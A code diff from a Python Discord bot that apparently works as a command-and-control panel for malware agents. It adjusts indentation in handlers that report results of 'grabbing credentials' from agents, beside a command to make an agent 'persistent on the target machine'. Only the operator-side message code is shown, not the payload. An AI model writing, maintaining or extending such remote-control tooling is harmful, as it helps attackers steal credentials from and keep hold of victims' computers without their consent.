@@ -127,7 +127,7 @@ class InteractButton(discord.ui.View):
             os.remove(result)
         else:
             my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
-        await interaction.response.send_message(embed=my_embed)
+            await interaction.response.send_message(embed=my_embed)
 
     @discord.ui.button(label="Persistent", style=discord.ButtonStyle.gray, emoji="🔁")
     async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
@@ -287,7 +287,7 @@ async def creds(ctx: commands.Context):
             os.remove(result)
         else:
             my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
-        await ctx.reply(embed=my_embed)
+            await ctx.reply(embed=my_embed)
     
 
 @bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
